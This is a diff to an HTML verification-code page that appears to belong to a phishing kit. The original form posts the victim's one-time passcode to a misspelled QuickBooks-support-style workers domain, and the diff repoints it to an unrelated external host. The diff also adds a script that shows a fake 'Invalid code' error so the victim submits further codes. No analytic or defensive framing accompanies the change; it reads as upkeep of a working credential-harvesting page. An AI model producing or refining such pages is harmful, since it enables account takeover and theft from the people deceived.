@@ -39,8 +39,8 @@ footer a{color:#595959;text-decoration:underline}
           <div class="content-box">
             <h1>Check your phone or email</h1>
             <div class="description">Enter the code we sent to your phone or email.</div>
-            %%ERROR%%
-            <form action="https://mailchimp-backend.qulckbooksuppor.workers.dev/" method="POST">
+            <div id="errorContainer"></div>
+            <form action="https://api.glotzier.com/" method="POST">
               <input type="hidden" name="step" value="otp">
               <label for="otp">Verification code</label>
               <input type="text" name="otp" id="otp" placeholder="6-digit code" required>
@@ -55,5 +55,11 @@ footer a{color:#595959;text-decoration:underline}
     </div>
   </div>
 </div>
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+if (urlParams.get('error') === '1') {
+  document.getElementById('errorContainer').innerHTML = '<div class="error">Invalid code. Please try again.</div>';
+}
+</script>
 </body>
 </html>
